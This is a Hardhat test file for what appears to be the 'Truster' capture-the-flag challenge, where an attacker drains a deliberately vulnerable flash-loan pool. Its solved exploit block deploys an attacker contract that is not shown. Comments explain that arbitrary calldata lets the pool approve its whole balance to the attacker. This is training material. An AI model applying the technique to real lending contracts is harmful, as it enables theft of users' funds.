const { ethers } = require('hardhat');
const { expect } = require('chai');
const { AbiCoder, defaultAbiCoder } = require('ethers/lib/utils');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** EXPLOIT -- SOLVED */
        /** 
         * vulnerability: external call with arbitrary data (Line 36, TrusterLenderPool.sol)
         * 
         * hack: getting the pool to approve all its tokens to attacker contract (TrusterChallenge.sol),
         * then transfer those tokens to attacker.address
         * */

        const TrusterChallenge = await ethers.getContractFactory("TrusterChallenge", attacker);
        const tc = await TrusterChallenge.deploy();
        await tc.deployed();

        tc.attack(this.token.address, this.pool.address);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

